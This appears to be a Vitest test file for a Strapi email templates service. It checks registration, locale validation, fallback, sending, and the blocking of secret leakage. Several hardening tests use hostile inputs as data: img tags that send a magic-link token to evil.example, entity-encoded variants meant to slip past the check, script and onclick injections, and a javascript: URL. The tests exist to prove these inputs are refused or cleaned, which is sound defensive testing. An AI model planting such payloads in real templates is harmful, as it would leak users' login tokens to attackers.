/* eslint-disable no-script-url */
import { beforeEach, describe, expect, it, vi } from 'vitest';
import type { Core } from '@strapi/types';

import { errors } from '@strapi/utils';

import * as sanitize from '../sanitize';
import createTemplatesService from '../templates';

type Row = { id: number; key: string; locale: string; subject: string; html: string; text: string };

const defaultsDef = {
  defaults: { subject: 'Reset for {{ user.name }}', html: '<p>{{ url }}</p>', text: '{{ url }}' },
  variables: ['user.name', 'url'],
  description: 'Reset password',
};

const createStrapi = (isLoaded = false) => {
  const warn = vi.fn();
  let rows: Row[] = [];

  const matches = (row: Row, where: Record<string, any>) =>
    Object.entries(where).every(([field, value]) =>
      value && typeof value === 'object' && '$in' in value
        ? value.$in.includes((row as any)[field])
        : (row as any)[field] === value
    );

  const db = {
    findMany: vi.fn(async ({ where }) => rows.filter((row) => matches(row, where))),
    findOne: vi.fn(async ({ where }) => rows.find((row) => matches(row, where)) ?? null),
    create: vi.fn(async ({ data }) => {
      rows.push({ id: rows.length + 1, ...data });
    }),
    update: vi.fn(async ({ where, data }) => {
      const row = rows.find((candidate) => matches(candidate, where));
      if (row) {
        Object.assign(row, data);
      }
    }),
    deleteMany: vi.fn(async ({ where }) => {
      rows = rows.filter((row) => !matches(row, where));
    }),
  };

  const send = vi.fn().mockResolvedValue(undefined);

  const strapi = {
    isLoaded,
    log: { warn },
    db: { query: vi.fn(() => db) },
    plugin: vi.fn(() => ({ service: vi.fn(() => ({ send })) })),
  } as unknown as Core.Strapi;

  return { strapi, db, send, warn, getRows: () => rows };
};

describe('Templates service', () => {
  let ctx: ReturnType<typeof createStrapi>;
  let service: ReturnType<typeof createTemplatesService>;

  beforeEach(() => {
    ctx = createStrapi();
    service = createTemplatesService({ strapi: ctx.strapi });
    service.register('end-users.reset-password', defaultsDef);
  });

  describe('register', () => {
    it('refuses a second register for the same key', () => {
      expect(() => service.register('end-users.reset-password', defaultsDef)).toThrow(
        'already registered'
      );
    });

    it('refuses to register once Strapi has loaded', () => {
      const loaded = createStrapi(true);
      const late = createTemplatesService({ strapi: loaded.strapi });

      expect(() => late.register('late.key', defaultsDef)).toThrow('register() or bootstrap()');
    });
  });

  describe('locale and key validation', () => {
    const body = { subject: 's', html: 'h', text: 't' };
    const badLocales = ['', 'x', '../en', 'en/../../x', 'en_US', 'a'.repeat(17), 'en-'];

    it.each(badLocales)('refuses the locale %j on get, update and reset', async (locale) => {
      const key = 'end-users.reset-password';

      await expect(service.get(key, locale)).rejects.toThrow('locale');
      await expect(service.update(key, locale, body)).rejects.toThrow('locale');
      await expect(service.reset(key, locale)).rejects.toThrow('locale');
      expect(ctx.getRows()).toEqual([]);
    });

    it.each(['en', 'fr', 'pt-BR', 'zh-Hans', 'es-419'])('accepts the locale %s', async (locale) => {
      await expect(service.get('end-users.reset-password', locale)).resolves.toBeDefined();
    });

    it('refuses an unregistered key on update and reset', async () => {
      await expect(service.update('nope.key', 'en', body)).rejects.toThrow(
        'Unknown email template'
      );
      await expect(service.reset('nope.key', 'en')).rejects.toThrow('Unknown email template');
      expect(ctx.getRows()).toEqual([]);
    });
  });

  describe('get', () => {
    it('falls back from the locale to en to the defaults', async () => {
      const defaults = await service.get('end-users.reset-password', 'fr');
      expect(defaults).toMatchObject({
        key: 'end-users.reset-password',
        locale: 'fr',
        subject: 'Reset for {{ user.name }}',
        variables: ['user.name', 'url'],
        isDefault: true,
      });

      await service.update('end-users.reset-password', 'en', { subject: 'EN', html: '', text: '' });
      expect(await service.get('end-users.reset-password', 'fr')).toMatchObject({
        subject: 'EN',
        isDefault: false,
      });

      await service.update('end-users.reset-password', 'fr', { subject: 'FR', html: '', text: '' });
      expect(await service.get('end-users.reset-password', 'fr')).toMatchObject({ subject: 'FR' });
      expect(await service.get('end-users.reset-password')).toMatchObject({
        locale: 'en',
        subject: 'EN',
      });
    });

    it('throws for an unknown key', async () => {
      await expect(service.get('nope')).rejects.toThrow('Unknown email template');
    });
  });

  describe('update and reset', () => {
    it('update stores a row per key and locale; reset deletes it', async () => {
      const body = { subject: 'S', html: '<p>H</p>', text: 'T' };

      await service.update('end-users.reset-password', 'en', body);
      await service.update('end-users.reset-password', 'en', { ...body, subject: 'S2' });
      await service.update('end-users.reset-password', 'fr', body);

      expect(ctx.getRows()).toHaveLength(2);
      expect(ctx.getRows().find((row) => row.locale === 'en')?.subject).toBe('S2');

      await service.reset('end-users.reset-password', 'fr');

      expect(ctx.getRows().map((row) => row.locale)).toEqual(['en']);
      expect(await service.get('end-users.reset-password', 'fr')).toMatchObject({ subject: 'S2' });
    });

    it('does not return the numeric id', async () => {
      const detail = await service.update('end-users.reset-password', 'en', {
        subject: 'S',
        html: '',
        text: '',
      });

      expect(detail).not.toHaveProperty('id');
    });

    it('refuses an unknown key', async () => {
      await expect(
        service.update('nope', 'en', { subject: '', html: '', text: '' })
      ).rejects.toThrow('Unknown email template');
      await expect(service.reset('nope', 'en')).rejects.toThrow('Unknown email template');
    });
  });

  describe('list', () => {
    it('lists registered templates, filtered by prefix, with their locales', async () => {
      service.register('other.welcome', { ...defaultsDef, description: undefined });
      await service.update('end-users.reset-password', 'fr', { subject: 'FR', html: '', text: '' });

      expect(await service.list('end-users.')).toEqual([
        {
          key: 'end-users.reset-password',
          description: 'Reset password',
          locales: ['en', 'fr'],
          customised: true,
        },
      ]);

      expect(await service.list()).toEqual([
        expect.objectContaining({ key: 'end-users.reset-password' }),
        { key: 'other.welcome', description: '', locales: ['en'], customised: false },
      ]);
    });
  });

  describe('sendTemplate', () => {
    it('renders subject, html and text and calls send with them', async () => {
      await service.sendTemplate(
        'end-users.reset-password',
        'ana@example.com',
        { user: { name: '<Ana>' }, url: 'https://x.test/?a=1&b=2' },
        { locale: 'fr' }
      );

      expect(ctx.send).toHaveBeenCalledWith({
        to: 'ana@example.com',
        subject: 'Reset for <Ana>',
        html: '<p>https://x.test/?a=1&amp;b=2</p>',
        text: 'https://x.test/?a=1&b=2',
      });
    });

    it('uses the stored template for the locale', async () => {
      await service.update('end-users.reset-password', 'fr', {
        subject: 'Salut {{ user.name }}',
        html: '',
        text: 'Lien {{ url }}',
      });

      await service.sendTemplate(
        'end-users.reset-password',
        'a@b.c',
        { user: { name: 'Ana' } },
        {
          locale: 'fr',
        }
      );

      expect(ctx.send).toHaveBeenCalledWith(
        expect.objectContaining({ subject: 'Salut Ana', text: 'Lien ' })
      );
    });

    it('throws for an unknown key', async () => {
      await expect(service.sendTemplate('nope', 'a@b.c', {})).rejects.toThrow(
        'Unknown email template'
      );
      expect(ctx.send).not.toHaveBeenCalled();
    });
  });

  describe('hardening on save', () => {
    beforeEach(() => {
      service.register('end-users.magic-link', {
        defaults: { subject: 'S', html: '<p>{{ url }}</p>', text: '{{ url }}' },
        variables: ['email', { name: 'url', secret: true }],
      });
    });

    it('lists secret variables by name like any other', async () => {
      expect((await service.get('end-users.magic-link')).variables).toEqual(['email', 'url']);
    });

    it('refuses a secret variable outside text and links, naming it', async () => {
      await expect(
        service.update('end-users.magic-link', 'en', {
          subject: 'S',
          html: '<img src="https://evil.example/?t={{ url }}">',
          text: '{{ url }}',
        })
      ).rejects.toThrow(/\{\{ url \}\}/);

      expect(ctx.getRows()).toEqual([]);
    });

    it('stores the cleaned HTML and keeps a secret in a link', async () => {
      const saved = await service.update('end-users.magic-link', 'en', {
        subject: 'S',
        html: '<script>x()</script><a href="{{ url }}" onclick="x()">Sign in</a>',
        text: '{{ url }}',
      });

      expect(saved.html).toBe('<a href="{{ url }}">Sign in</a>');
      expect(ctx.getRows()[0].html).toBe('<a href="{{ url }}">Sign in</a>');
    });

    it('does not restrict a variable that is not declared secret', async () => {
      await expect(
        service.update('end-users.reset-password', 'en', {
          subject: 'S',
          html: '<img src="https://example.com/{{ url }}">',
          text: 'x',
        })
      ).resolves.toBeDefined();
    });
  });
  describe('hardening: what is checked is what is stored', () => {
    const key = 'end-users.magic-link';
    const save = (html: string) =>
      service.update(key, 'en', { subject: 'S', html, text: '{{ url }}' });

    beforeEach(() => {
      service.register(key, {
        defaults: { subject: 'S', html: '<p>{{ url }}</p>', text: '{{ url }}' },
        variables: ['email', { name: 'url', secret: true, url: true }],
      });
    });

    it.each([
      '<img src="https://evil.example/?t=&#123;&#123; url &#125;&#125;">',
      '<img src="https://evil.example/?t=&#x7B;&#x7B; url &#x7D;&#x7D;">',
      '<img src="https://evil.example/?t=&#123&#123 url &#125&#125">',
      '<a href="https://x.test" title="&#123;&#123; url &#125;&#125;">x</a>',
    ])('refuses an entity-encoded placeholder: %s', async (html) => {
      await expect(save(html)).rejects.toThrow(/\{\{ url \}\}/);
      await expect(save(html)).rejects.toBeInstanceOf(errors.ValidationError);
      expect(ctx.getRows()).toEqual([]);
    });

    it('stores exactly the HTML it checked', async () => {
      const html = '<script>x()</script><p onclick="x()">Hi</p><a href="{{ url }}">Go</a>';
      const check = vi.spyOn(sanitize, 'findMisplacedSecrets');

      const saved = await save(html);

      expect(check).toHaveBeenCalledTimes(1);
      expect(check.mock.calls[0][0]).toBe(saved.html);
      expect(ctx.getRows()[0].html).toBe(saved.html);
      expect(saved.html).toBe('<p>Hi</p><a href="{{ url }}">Go</a>');
      check.mockRestore();
    });

    it('accepts a leading placeholder in href only for a secret or url variable', async () => {
      service.register('other.promo', {
        defaults: { subject: 'S', html: '', text: '' },
        variables: ['name', { name: 'link', url: true }, { name: 'code', secret: true }],
      });
      const body = (html: string) => ({ subject: 'S', html, text: '' });

      expect(
        (await service.update('other.promo', 'en', body('<a href="{{ link }}">a</a>'))).html
      ).toBe('<a href="{{ link }}">a</a>');
      expect(
        (await service.update('other.promo', 'en', body('<a href="{{ code }}">a</a>'))).html
      ).toBe('<a href="{{ code }}">a</a>');
      expect(
        (await service.update('other.promo', 'en', body('<a href="{{ name }}">a</a>'))).html
      ).toBe('<a href>a</a>');
    });
  });

  describe('hardening at send time', () => {
    const key = 'end-users.magic-link';
    const defaults = {
      subject: 'Default',
      html: '<p><a href="{{ url }}">Go</a></p>',
      text: 'Default {{ url }}',
    };

    beforeEach(() => {
      service.register(key, {
        defaults,
        variables: ['email', { name: 'url', secret: true, url: true }],
      });
    });

    it('sends the registered default, and warns with the key, for a stored row that leaks a secret', async () => {
      // A row written without the save-time check, such as one saved before it existed.
      ctx.getRows().push({
        id: 1,
        key,
        locale: 'en',
        subject: 'Stored',
        html: '<img src="https://evil.example/?t={{ url }}">',
        text: 'Stored {{ url }}',
      });

      await service.sendTemplate(key, 'a@b.c', { url: 'https://app.test/magic?t=1' });

      expect(ctx.send).toHaveBeenCalledWith({
        to: 'a@b.c',
        subject: 'Default',
        html: '<p><a href="https://app.test/magic?t=1">Go</a></p>',
        text: 'Default https://app.test/magic?t=1',
      });
      expect(ctx.warn).toHaveBeenCalledTimes(1);
      expect(ctx.warn.mock.calls[0][0]).toContain(`"${key}"`);
      expect(ctx.warn.mock.calls[0][0]).toContain('{{ url }}');
    });

    it('uses a stored row that keeps its secrets in text and links, without a warning', async () => {
      await service.update(key, 'en', {
        subject: 'Stored',
        html: '<a href="{{ url }}">Sign in</a>',
        text: '{{ url }}',
      });

      await service.sendTemplate(key, 'a@b.c', { url: 'https://app.test/magic' });

      expect(ctx.send).toHaveBeenCalledWith(
        expect.objectContaining({
          subject: 'Stored',
          html: '<a href="https://app.test/magic">Sign in</a>',
        })
      );
      expect(ctx.warn).not.toHaveBeenCalled();
    });

    it('empties a link value that is not http, https or mailto', async () => {
      await service.sendTemplate(key, 'a@b.c', { url: 'javascript:alert(1)' });

      expect(ctx.send).toHaveBeenCalledWith(
        expect.objectContaining({ html: '<p><a href="">Go</a></p>' })
      );
    });
  });
});
